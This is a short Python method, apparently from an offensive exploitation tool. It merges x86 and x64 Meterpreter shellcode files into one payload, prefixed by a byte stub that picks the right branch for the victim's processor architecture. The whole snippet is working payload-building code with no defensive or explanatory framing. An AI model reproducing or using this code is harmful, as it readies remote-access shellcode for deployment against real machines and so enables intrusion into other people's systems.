def create_payload(self, x86_file, x64_file, payload_file):
        """
            Creates the final payload based on the x86 and x64 meterpreters.
        """
        sc_x86 = open(os.path.join(self.datadir, x86_file), 'rb').read()
        sc_x64 = open(os.path.join(self.datadir, x64_file), 'rb').read()

        fp = open(os.path.join(self.datadir, payload_file), 'wb')
        fp.write(b'\x31\xc0\x40\x0f\x84' + pack('<I', len(sc_x86)))
        fp.write(sc_x86)
        fp.write(sc_x64)
        fp.close()